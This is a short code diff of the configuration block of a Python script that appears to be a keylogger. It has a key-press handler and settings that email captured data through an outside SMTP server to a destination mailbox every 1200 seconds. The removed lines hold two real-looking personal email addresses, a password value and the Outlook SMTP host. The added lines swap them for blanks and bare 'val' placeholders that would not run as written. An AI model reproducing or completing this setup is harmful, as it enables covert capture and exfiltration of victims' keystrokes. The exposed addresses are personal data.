@@ -53,13 +53,13 @@ import threading
 from lib.holtManager import *
 
 #settings
-filePath = "wrench\\wrench.h0lt" #use only the filename.ext if inside usb drive root
-source = "carramba54@outlook.com" #source mail
-psw = "MailSenderpsw" #source psw
-destination = "matteodipiero00@gmail.com" #dest mail
-subject = "Subject: wrench\n\n" #mail subject
-serverSMTP= ["smtp-mail.outlook.com",587] #example "smtp.gmail.com" and 465
-sendDelay =1200 #sending time delay
+filePath = "" #use only the filename.ext if inside usb drive root
+source = "" #source mail
+psw = "" #source psw
+destination = "" #dest mail
+subject = "Subject: "+""+"\n\n" #mail subject 
+serverSMTP= ["",val] #example "smtp.gmail.com" and 465
+sendDelay =val #sending time delay
 
 def keyPressed(key):
     try:
